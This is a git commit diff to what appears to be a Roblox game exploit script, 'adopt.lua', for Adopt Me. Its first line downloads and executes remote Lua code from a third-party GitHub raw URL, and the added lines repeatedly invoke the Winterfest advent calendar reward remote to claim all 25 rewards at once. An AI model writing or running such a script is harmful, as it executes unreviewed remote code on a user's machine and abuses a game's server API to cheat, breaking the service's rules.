77d1970e019eed93cda49b1536da16fc8c96f81d
greg66n <darien95sm@hotmail.com>
2024-12-01 09:31:35 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,1 +1,7 @@
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
+wait(15)
+for i = 1, 25 do
+    local args = {i}  
+    game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
+    wait(0.3)  
+end
